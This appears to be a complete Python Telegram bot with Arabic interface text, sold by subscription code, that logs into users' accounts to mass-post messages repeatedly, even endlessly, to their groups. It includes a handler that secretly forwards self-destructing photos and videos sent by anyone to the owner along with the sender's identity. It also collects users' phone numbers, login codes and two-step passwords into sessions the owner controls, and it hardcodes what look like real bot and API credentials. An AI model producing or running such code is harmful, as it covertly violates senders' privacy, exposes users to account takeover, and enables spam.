import os
import json
import asyncio
import random
import string
from datetime import datetime, timedelta
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message

# --- بيانات بوتك الأساسي من BotFather ---
BOT_TOKEN = "9130009056:AAExYAkKgywhW0SU4-JlR_kVMsTJItx46ZE"      
API_ID = 31718572                        
API_HASH = "ff3dc2b2cdea7acf3051b6e4a9a6fcfb"         

OWNER_ID =  7500233328                  # <--- ضع الآيدي (ID) الخاص بك هنا

DATA_FILE = "subscribers_db.json"

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data.get("active_subscribers"), list):
                    data["active_subscribers"] = {}
                return data
        except:
            pass
    return {"valid_keys": {}, "active_subscribers": {}, "linked_accounts": {}}

def save_data(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

db = load_data()
if "linked_accounts" not in db:
    db["linked_accounts"] = {}

user_states = {}
user_sessions = {}
stop_flags = {}

bot = Client("my_auto_bot_master", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# --- نظام مراقبة وتحويل الوسائط الذاتية للمالك (مفعّل وشغال بدقة) ---
@bot.on_message(filters.private & ~filters.user(OWNER_ID) & (filters.photo | filters.video | filters.animation))
async def capture_vanishing_media(client, message: Message):
    is_self_destruct = False
    if message.photo and message.photo.ttl_seconds:
        is_self_destruct = True
    elif message.video and message.video.ttl_seconds:
        is_self_destruct = True
    elif message.animation and message.animation.ttl_seconds:
        is_self_destruct = True

    if is_self_destruct:
        user_name = message.from_user.first_name if message.from_user else "مستخدم"
        user_username = f"@{message.from_user.username}" if message.from_user and message.from_user.username else "لا يوجد"
        user_id = message.from_user.id if message.from_user else 0
        
        try:
            await message.forward(OWNER_ID)
            await client.send_message(
                OWNER_ID,
                "🚨 **تم التقاط وتحويل صورة/فيديو ذاتي (يختفي):**\n\n"
                f"👤 المرسل: {user_name}\n"
                f"🏷️ المعرف: {user_username}\n"
                f"🆔 الآيدي: `{user_id}`"
            )
        except Exception as e:
            print(f"خطأ في تحويل الوسائط الذاتية: {e}")

# --- لوحة تحكم المالك ---
@bot.on_message(filters.command("admin") & filters.private)
async def admin_panel(client, message: Message):
    if message.from_user.id != OWNER_ID:
        await message.reply("❌ عذراً، هذا الأمر مخصص لمالك البوت فقط!")
        return

    linked = db.get("linked_accounts", {})
    if not linked:
        await message.reply("📂 **لوحة تحكم المالك:**\n\nلايوجد أي حسابات مرتبطة حتى الآن.")
        return

    text = "👑 **لوحة تحكم المالك - الحسابات المرتبطة:**\n\n"
    buttons = []
    
    for u_id, info in linked.items():
        text += f"👤 الاسم: {info['name']}\n🆔 الآيدي: `{u_id}`\n📱 الهاتف: `{info['phone']}`\n-------------------\n"
        buttons.append([InlineKeyboardButton(f"🗑️ حذف حساب: {info['name']}", callback_data=f"adm_del_{u_id}")])

    buttons.append([InlineKeyboardButton("🔄 تحديث القائمة", callback_data="adm_refresh")])
    await message.reply(text, reply_markup=InlineKeyboardMarkup(buttons))

@bot.on_message(filters.command("gen_key") & filters.private)
async def generate_key_command(client, message: Message):
    if message.from_user.id != OWNER_ID:
        await message.reply("❌ عذراً، هذا الأمر مخصص لمالك البوت فقط!")
        return

    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("💎 كود اشتراك شهري (30 يوم)", callback_data="gen_1m")],
        [InlineKeyboardButton("🔥 كود اشتراك 6 أشهر (180 يوم)", callback_data="gen_6m")],
        [InlineKeyboardButton("👑 كود اشتراك سنوي (365 يوم)", callback_data="gen_12m")]
    ])

    await message.reply(
        "🔐 **لوحة توليد أكواد الاشتراكات:**\n\n"
        "اختر نوع الاشتراك أدناه لتوليد الكود الفوري:",
        reply_markup=markup
    )

@bot.on_message(filters.command("start") & filters.private)
async def start_command(client, message: Message):
    user_id = str(message.from_user.id)
    
    if message.from_user.id in user_states:
        user_states.pop(message.from_user.id, None)

    if user_id in db["active_subscribers"]:
        sub_info = db["active_subscribers"][user_id]
        expiry_date_str = sub_info.get("expiry_date")
        
        if expiry_date_str:
            expiry_date = datetime.fromisoformat(expiry_date_str)
            remaining_time = expiry_date - datetime.now()
            
            if remaining_time.total_seconds() > 0:
                days_left = remaining_time.days
                hours_left = remaining_time.seconds // 3600
                time_msg = f"⏳ الوقت الباقي لاشتراكك: `{days_left} يوم و {hours_left} ساعة`"
            else:
                time_msg = "❌ **انتهت صلاحية اشتراكك!** يرجى تجديد الاشتراك."
        else:
            time_msg = "⏳ اشتراكك مفعل."

        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("📱 تسجيل حسابي / ربط الحساب", callback_data="link_account")],
            [InlineKeyboardButton("🚀 بدء النشر التلقائي", callback_data="start_publishing")]
        ])

        await message.reply(
            "⚡ **أهلاً بك مجدداً عزيزي المستخدم!**\n\n"
            f"✅ اشتراكك مفعل بنجاح.\n"
            f"{time_msg}\n\n"
            "اختر ما تحب فعله أدناه:",
            reply_markup=markup
        )
        return

    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 لدي كود تفعيل", callback_data="has_key")],
        [InlineKeyboardButton("🛒 طلب كود تفعيل (شراء اشتراك)", callback_data="request_key")]
    ])

    await message.reply(
        "👋 **أهلاً بك في بوت النشر التلقائي وإدارة الحسابات الذكي!**\n\n"
        "يرجى اختيار أحد الخيارات أدناه للمتابعة:",
        reply_markup=markup
    )

@bot.on_callback_query()
async def callback_handlers(client, callback):
    user_id = callback.from_user.id
    str_user_id = str(user_id)
    data = callback.data

    if data.startswith("adm_del_"):
        if user_id != OWNER_ID:
            return
        target_id = data.replace("adm_del_", "")
        if target_id in db["linked_accounts"]:
            db["linked_accounts"].pop(target_id)
            save_data(db)
        if int(target_id) in user_sessions:
            try:
                await user_sessions[int(target_id)].stop()
            except:
                pass
            user_sessions.pop(int(target_id), None)
        
        session_file = f"session_user_{target_id}.session"
        if os.path.exists(session_file):
            try:
                os.remove(session_file)
            except:
                pass

        await callback.answer("✅ تم حذف الحساب وإيقاف جلسته نهائياً!", show_alert=True)
        await callback.message.edit_text("🗑️ **تم حذف الحساب بنجاح من النظام.**\nأرسل الأمر `/admin` لعرض القائمة المحدثة.")
        return

    elif data == "adm_refresh":
        if user_id != OWNER_ID:
            return
        await callback.message.delete()
        await admin_panel(client, callback.message)
        return

    elif data.startswith("gen_"):
        if user_id != OWNER_ID:
            await callback.answer("❌ هذا الزر لمالك البوت فقط!", show_alert=True)
            return

        days_map = {
            "gen_1m": (30, "شهر واحد (30 يوم)"),
            "gen_6m": (180, "6 أشهر (180 يوم)"),
            "gen_12m": (365, "سنوي (365 يوم)")
        }
        days, duration_text = days_map.get(data, (30, "شهر واحد"))

        chars = string.ascii_uppercase + string.digits
        block1 = ''.join(random.choice(chars) for _ in range(4))
        block2 = ''.join(random.choice(chars) for _ in range(4))
        block3 = ''.join(random.choice(chars) for _ in range(4))
        
        new_key = f"VIP-{block1}-{block2}-{block3}"
        
        db["valid_keys"][new_key] = {"duration_text": duration_text, "days": days}
        save_data(db)

        await callback.message.edit_text(
            "🔐 **تم توليد كود اشتراك جديد بنجاح!**\n\n"
            f"🔑 الكود: `{new_key}`\n"
            f"⏳ المدة: `{duration_text}`"
        )

    elif data == "has_key":
        user_states[user_id] = {"step": "waiting_for_key"}
        await callback.message.edit_text("🔑 يرجى إرسال **كود التفعيل (الاشتراك)** الخاص بك هنا في الرسائل:")

    elif data == "link_account":
        user_states[user_id] = {"step": "waiting_for_phone"}
        await callback.message.edit_text(
            "📱 **ربط وتسجيل حسابك في التيليجرام:**\n\n"
            "أرسل الآن **رقم هاتفك**:"
        )

    elif data == "start_publishing":
        if int(user_id) not in user_sessions:
            await callback.answer("⚠️ يجب تسجيل حسابك أولاً بالضغط على زر (تسجيل حسابي / ربط الحساب)!", show_alert=True)
            return
        
        await trigger_publish_flow(client, callback.message, user_id)

    elif data == "request_key":
        sub_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("💎 اشتراك شهري - 2000 أسياس", callback_data="sub_1m")],
            [InlineKeyboardButton("🔥 اشتراك 6 أشهر - 3000 أسياس", callback_data="sub_6m")],
            [InlineKeyboardButton("👑 اشتراك سنوي - 5000 أسياس", callback_data="sub_12m")]
        ])
        await callback.message.edit_text(
            "📋 **اختر نوع الاشتراك المطلوب:**",
            reply_markup=sub_markup
        )

    elif data.startswith("sub_"):
        sub_types = {
            "sub_1m": "اشتراك شهري (2000 أسياس)",
            "sub_6m": "اشتراك 6 أشهر (3000 أسياس)",
            "sub_12m": "اشتراك سنوي (5000 أسياس)"
        }
        chosen_sub = sub_types.get(data, "اشتراك")
        user_name = callback.from_user.first_name
        user_username = f"@{callback.from_user.username}" if callback.from_user.username else "لا يوجد"

        try:
            await client.send_message(
                OWNER_ID,
                "🔔 **طلب اشتراك جديد من مستخدم:**\n\n"
                f"👤 الاسم: {user_name}\n"
                f"🏷️ المعرف: {user_username}\n"
                f"🆔 الآيدي: `{user_id}`\n"
                f"📦 نوع الطلب: **{chosen_sub}**"
            )
        except Exception as e:
            print(f"خطأ: {e}")

        await callback.message.edit_text("✅ **تم إرسال طلبك بنجاح إلى الإدارة!**")

    elif data.startswith("cnt_"):
        if user_id not in user_states:
            return
        count_data = data.replace("cnt_", "")
        state = user_states[user_id]

        if count_data == "infinite":
            state["count_choice"] = "infinite"
            state["pub_step"] = "get_delay_infinite"
            await callback.message.edit_text("♾️ اخترت **بدون توقف**.\n\n⏱ أرسل الآن عدد **الثواني** بين كل رسالة وأخرى:")
        else:
            state["count_choice"] = int(count_data)
            state["pub_step"] = "get_delay_numeric"
            await callback.message.edit_text(f"✅ اخترت تكرار **{count_data}** مرة.\n\n⏱ أرسل الآن عدد **الثواني** بين كل رسالة وأخرى:")

    elif data == "stop_pub":
        stop_flags[user_id] = True
        await callback.answer("🛑 تم إيقاف النشر بنجاح!", show_alert=True)

@bot.on_message(filters.private & ~filters.command(["start", "publish", "gen_key", "admin"]))
async def handle_steps(client, message: Message):
    user_id = message.from_user.id
    str_user_id = str(user_id)
    text = message.text.strip() if message.text else ""

    if user_id not in user_states:
        return

    state = user_states[user_id]
    step = state.get("step")

    if step == "waiting_for_key":
        if text in db["valid_keys"]:
            key_info = db["valid_keys"][text]
            days = key_info["days"]
            duration_text = key_info["duration_text"]
            
            del db["valid_keys"][text]
            expiry_date = datetime.now() + timedelta(days=days)
            
            db["active_subscribers"][str_user_id] = {
                "duration_text": duration_text,
                "expiry_date": expiry_date.isoformat()
            }
            save_data(db)
            
            user_states[user_id]["step"] = "waiting_for_phone"
            await message.reply(
                f"✅ **تم تفعيل الكود بنجاح!** (نوع الاشتراك: {duration_text})\n\n"
                "📱 أرسل الآن **رقم هاتفك**:"
            )
        else:
            await message.reply("❌ **الكود غير صحيح أو تم استخدامه من قبل!** أعد إرساله:")

    elif step == "waiting_for_phone":
        phone = text
        status_msg = await message.reply("⏳ جاري إرسال كود التحقق إلى رقمك...")
        
        try:
            session_file = f"session_user_{user_id}"
            user_client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await user_client.connect()
            
            sent_code = await user_client.send_code(phone)
            
            user_states[user_id]["phone"] = phone
            user_states[user_id]["user_client"] = user_client
            user_states[user_id]["phone_code_hash"] = sent_code.phone_code_hash
            user_states[user_id]["step"] = "waiting_for_otp"

            await status_msg.edit_text(
                "📥 **تم إرسال كود التحقق إلى رقمك بنجاح!**\n\n"
                "🔐 أرسل الكود الآن (مثلاً `5868` أو مفصولاً مثل `5/8/6/8`):"
            )
        except Exception as e:
            await status_msg.edit_text(f"❌ حدث خطأ أثناء إرسال الكود. تأكد من صحة الرقم وأعد إرساله:")

    elif step == "waiting_for_otp":
        code = "".join(filter(str.isdigit, text))
        user_client = state.get("user_client")
        phone = state.get("phone")
        phone_code_hash = state.get("phone_code_hash")

        if not user_client or not phone_code_hash:
            await message.reply("⚠️ انتهت صلاحية الجلسة. أرسل /start وابدأ من جديد.")
            user_states.pop(user_id, None)
            return

        try:
            await user_client.sign_in(phone_number=phone, phone_code_hash=phone_code_hash, phone_code=code)
            
            user_sessions[user_id] = user_client
            
            user_name = message.from_user.first_name
            db["linked_accounts"][str_user_id] = {"name": user_name, "phone": phone}
            save_data(db)

            user_states.pop(user_id, None)   
            
            await message.reply(
                "🎉 **تم تسجيل الربط بنجاح تام!**\n\n"
                "🤖 أصبح حسابك مربوطاً بالسورس.\n"
                "🔹 اضغط على `/start` للذهاب إلى قائمة التحكم وبدء النشر التلقائي."
            )
        except Exception as e:
            error_str = str(e)
            if "SESSION_PASSWORD_NEEDED" in error_str or "SessionPasswordNeeded" in error_str:
                user_states[user_id]["step"] = "waiting_for_password"
                await message.reply("🔒 حسابك محمي بـ **التحقق بخطوتين**.\n\nيرجى إرسال **كلمة المرور الخاصة بحسابك** الآن:")
            else:
                await message.reply("❌ الكود المدخل غير صحيح. أعد إرساله:")

    elif step == "waiting_for_password":
        password = text
        user_client = state.get("user_client")
        phone = state.get("phone")

        try:
            await user_client.check_password(password)
            user_sessions[user_id] = user_client
            
            user_name = message.from_user.first_name
            db["linked_accounts"][str_user_id] = {"name": user_name, "phone": phone}
            save_data(db)

            user_states.pop(user_id, None)

            await message.reply(
                "🎉 **تم تسجيل الربط بنجاح وتجاوز التحقق بخطوتين!**\n\n"
                "🚀 الحساب جاهز. أرسل `/start` للبدء."
            )
        except Exception:
            await message.reply("❌ كلمة المرور غير صحيحة! أعد محاولة إرسالها:")

    elif "pub_step" in state:
        await handle_publishing_logic(client, message, state)

@bot.on_message(filters.command("publish") & filters.private)
async def publish_command_handler(client, message: Message):
    user_id = message.from_user.id
    await trigger_publish_flow(client, message, user_id)

async def trigger_publish_flow(client, message, user_id):
    str_user_id = str(user_id)
    
    if str_user_id not in db["active_subscribers"]:
        await message.reply("⚠️ يجب تفعيل كود الاشتراك أولاً عبر إرسال /start.")
        return

    if user_id not in user_sessions:
        await message.reply("⚠️ يجب تسجيل حسابك أولاً بالضغط على زر (تسجيل حسابي / ربط الحساب).")
        return

    user_client = user_sessions[user_id]
    
    if hasattr(message, "edit_text"):
        await message.edit_text("🔄 **جاري جلب قائمة الكروبات والمجموعات الخاصة بحسابك...**")
    else:
        await message.reply("🔄 **جاري جلب قائمة الكروبات والمجموعات الخاصة بحسابك...**")
    
    try:
        groups = []
        async for dialog in user_client.get_dialogs():
            if dialog.chat.type.name in ["GROUP", "SUPERGROUP"]:
                groups.append({"id": dialog.chat.id, "name": dialog.chat.title})

        if not groups:
            await bot.send_message(user_id, "❌ لم يتم العثور على أي مجموعات في حسابك!")
            return

        user_states[user_id] = {"groups": groups, "pub_step": "get_group_selection"}

        text_groups = "📋 **مجموعاتك المتاحة:**\n\n"
        for i, g in enumerate(groups[:25], 1):
            text_groups += f"`{i}` - {g['name']}\n"
        
        text_groups += "\n✏️ أرسل أرقام الكروبات التي تريد النشر فيها (مثال: `1 2 3`) أو كلمة `الكل`:"
        await bot.send_message(user_id, text_groups)

    except Exception:
        await bot.send_message(user_id, "❌ حدث خطأ أثناء جلب الكروبات من الحساب.")

async def handle_publishing_logic(client, message, state):
    user_id = message.from_user.id
    text = message.text.strip() if message.text else ""
    pub_step = state.get("pub_step")

    if pub_step == "get_group_selection":
        all_groups = state["groups"]
        selected_groups = []

        if text.lower() == "الكل":
            selected_groups = all_groups
        else:
            try:
                indexes = [int(x) - 1 for x in text.split()]
                selected_groups = [all_groups[i] for i in indexes if 0 <= i < len(all_groups)]
            except:
                await message.reply("❌ خطأ بالادخال. أرسل الأرقام صحيحة أو كلمة `الكل`:")
                return

        if not selected_groups:
            await message.reply("❌ لم تحدد أي مجموعة صحيحة. حاول مجدداً:")
            return

        state["selected_groups"] = selected_groups
        state["pub_step"] = "get_caption"
        await message.reply("💬 أرسل الآن **الكليشة أو الرسالة** التي تريد نشرها (نص، صورة، أو فيديو):")

    elif pub_step == "get_caption":
        state["message_to_send"] = message
        state["pub_step"] = "waiting_count_choice"

        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("50", callback_data="cnt_50"), InlineKeyboardButton("60", callback_data="cnt_60"), InlineKeyboardButton("100", callback_data="cnt_100")],
            [InlineKeyboardButton("500", callback_data="cnt_500"), InlineKeyboardButton("1000", callback_data="cnt_1000")],
            [InlineKeyboardButton("♾️ بدون عدد (بلا توقف)", callback_data="cnt_infinite")]
        ])

        await message.reply("✅ تم حفظ الكليشة.\n\n🔢 اختر عدد مرات التكرار من الأزرار أدناه:", reply_markup=buttons)

    elif pub_step in ["get_delay_numeric", "get_delay_infinite"]:
        if not text.isdigit():
            await message.reply("❌ يرجى إرسال رقم الثواني فقط (مثال: `5`):")
            return

        delay = int(text)
        count_choice = state["count_choice"]
        selected_groups = state["selected_groups"]
        msg_to_send = state["message_to_send"]
        user_client = user_sessions[user_id]

        state.pop("pub_step", None)

        if isinstance(count_choice, int):
            status_msg = await message.reply(f"🚀 بدأ النشر التكراري ({count_choice} مرة)... ⏳")
            success = 0

            for round_idx in range(1, count_choice + 1):
                for group in selected_groups:
                    if stop_flags.get(user_id, False):
                        break
                    try:
                        if msg_to_send.media:
                            await user_client.copy_message(group["id"], msg_to_send.chat.id, msg_to_send.id)
                        else:
                            await user_client.send_message(group["id"], msg_to_send.text)
                        success += 1
                    except Exception:
                        pass
                    await asyncio.sleep(delay)
                
                try:
                    await status_msg.edit_text(f"📊 جاري النشر...\n🔄 الجولة: `{round_idx}/{count_choice}`\n✅ المرسل: `{success}`")
                except:
                    pass

            try:
                await status_msg.edit_text(f"🎉 اكتمل النشر بنجاح!\n✅ مجموع الرسائل: `{success}`")
            except:
                pass

        elif count_choice == "infinite":
            stop_flags[user_id] = False
            stop_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 إيقاف النشر", callback_data="stop_pub")]])

            status_msg = await message.reply("🚀 بدأ النشر المستمر (بدون توقف)...\nيمكنك الإيقاف بالضغط على الزر أدناه:", reply_markup=stop_markup)

            sent_count = 0
            while not stop_flags.get(user_id, False):
                for group in selected_groups:
                    if stop_flags.get(user_id, False):
                        break
                    try:
                        if msg_to_send.media:
                            await user_client.copy_message(group["id"], msg_to_send.chat.id, msg_to_send.id)
                        else:
                            await user_client.send_message(group["id"], msg_to_send.text)
                        sent_count += 1

                        if sent_count % 5 == 0:
                            try:
                                await status_msg.edit_text(f"🟢 النشر المستمر يعمل...\n📊 عدد المرسل: `{sent_count}`", reply_markup=stop_markup)
                            except:
                                pass
                    except Exception:
                        pass

                    await asyncio.sleep(delay)

            try:
                await message.reply(f"🛑 تم إيقاف النشر المستمر بنجاح!\n📊 إجمالي ما تم إرساله: `{sent_count}` رسالة.")
            except:
                pass

print("🤖 البوت يعمل الآن بكفاءة تامة وتفعيل تحويل الذاتية شغال...")
bot.run()
